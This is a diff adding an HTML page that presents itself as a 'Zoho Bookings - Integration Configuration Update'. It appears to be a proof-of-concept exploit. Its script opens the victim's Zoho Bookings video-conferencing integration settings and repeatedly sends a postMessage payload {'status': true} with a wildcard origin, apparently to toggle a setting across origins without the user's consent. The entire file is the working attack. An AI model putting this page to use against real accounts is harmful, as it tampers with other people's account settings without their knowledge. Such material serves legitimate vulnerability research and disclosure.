@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<title>Zoho Bookings - Integration Configuration Update</title>
+
+</head>
+
+<body>
+
+<script>
+
+var target = window.open('https://bookings.zoho.com/#/home/dashboard/settings/integrations/video-conferencing', 'zoho_bookings');
+
+var payload = JSON.stringify({"status": true});
+
+setTimeout(function() {
+
+setInterval(function() {
+
+try { target.postMessage(payload, '*'); } catch(e) {}
+
+}, 100);
+
+}, 2000);
+
+</script>
+
+</body>
+
+</html>
